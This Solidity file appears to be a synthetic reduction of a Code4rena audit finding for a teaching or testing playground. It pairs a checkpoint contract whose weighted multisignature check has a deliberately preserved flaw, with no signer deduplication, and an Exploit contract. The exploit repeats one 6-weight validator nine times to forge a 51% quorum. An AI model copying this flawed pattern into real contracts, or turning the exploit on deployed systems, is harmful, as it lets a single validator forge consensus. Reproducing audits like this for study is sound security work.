// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Recall — [H-01] Missing signature duplication check in submitCheckpoint
    (Code4rena 2025-02-recall; #65088)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: MultisignatureChecker.isValidWeightedMultiSignature sums
    signatory weights with no uniqueness check, so one active validator can
    repeat itself in signatories[] and accumulate weight past the majority
    threshold alone. Weight-accumulation line preserved (@> VULN).
    Source: code-423n4/2025-02-recall@ab5f90b9 contracts/lib/LibMultisignatureChecker.sol */

/// @dev Reduced MultisignatureChecker + checkpoint facet surface.
contract CheckpointQuorum {
    mapping(address => uint256) public power; // confirmed collateral / weight
    mapping(address => bool) public isActive;
    address[] public activeList;
    uint256 public totalActivePower;
    uint256 public majorityPercentage = 51; // same shape as SubnetActor
    bool public lastCheckpointAccepted;
    uint256 public acceptedWeight;
    uint256 public uniqueSignersOnLast;

    function addActiveValidator(address v, uint256 w) external {
        require(!isActive[v], "dup");
        isActive[v] = true;
        power[v] = w;
        totalActivePower += w;
        activeList.push(v);
    }

    /// @notice Reduced validateActiveQuorumSignatures + isValidWeightedMultiSignature.
    /// Signatures are treated as valid if the claimed signatory is active (ECDSA
    /// omitted — the bug is weight double-counting of the signatories array, not
    /// signature crypto).
    function submitCheckpoint(address[] memory signatories, bytes[] memory /*signatures*/) external {
        uint256 n = signatories.length;
        require(n > 0, "empty");
        // getTotalPowerOfValidators — reverts if any signatory not active
        uint256[] memory weights = new uint256[](n);
        for (uint256 i; i < n; ) {
            require(isActive[signatories[i]], "NotValidator");
            weights[i] = power[signatories[i]];
            unchecked {
                ++i;
            }
        }

        uint256 threshold = (totalActivePower * majorityPercentage) / 100;

        // MultisignatureChecker.isValidWeightedMultiSignature — no signatory uniqueness
        uint256 weight;
        for (uint256 i; i < n; ) {
            // signature would be recovered to signatories[i] here
            weight = weight + weights[i]; // @> VULN: no dedup — same validator weight can be summed many times
            // FIX: require sorted unique signatories (or seen[signatory] set) before adding weight
            unchecked {
                ++i;
            }
        }
        require(weight >= threshold, "WeightsSumLessThanThreshold");

        lastCheckpointAccepted = true;
        acceptedWeight = weight;

        // count unique for harm assertion (not in production)
        uniqueSignersOnLast = _countUnique(signatories);
    }

    function _countUnique(address[] memory a) internal pure returns (uint256 u) {
        for (uint256 i; i < a.length; i++) {
            bool seen;
            for (uint256 j; j < i; j++) {
                if (a[j] == a[i]) {
                    seen = true;
                    break;
                }
            }
            if (!seen) u++;
        }
    }
}

contract Exploit {
    CheckpointQuorum public quorum; // CREATE nonce 1 — vulnerable

    constructor() {
        quorum = new CheckpointQuorum();
        // 10 validators, total weight 100; majority threshold = 51
        // malicious validator weight 6 — alone far below 51
        address mal = address(0xA11CE);
        quorum.addActiveValidator(mal, 6);
        // 4*11 + 5*10 = 94 → total 100
        for (uint256 i = 1; i <= 9; i++) {
            uint256 w = i <= 4 ? 11 : 10;
            quorum.addActiveValidator(address(uint160(0xB000 + i)), w);
        }
    }

    function run() external {
        require(quorum.totalActivePower() == 100, "power");
        address mal = address(0xA11CE);

        // Malicious validator appears 9 times → weight = 6*9 = 54 >= 51
        address[] memory signatories = new address[](9);
        bytes[] memory signatures = new bytes[](9);
        for (uint256 i; i < 9; i++) {
            signatories[i] = mal;
            signatures[i] = hex"00";
        }

        quorum.submitCheckpoint(signatories, signatures);

        // Harm: checkpoint accepted with only 1 unique signer (true weight 6 of 100)
        require(quorum.lastCheckpointAccepted(), "accepted");
        require(quorum.uniqueSignersOnLast() == 1, "unique");
        require(quorum.acceptedWeight() >= 51, "forged quorum");
        require(quorum.power(mal) == 6, "true weight still 6");
    }
}
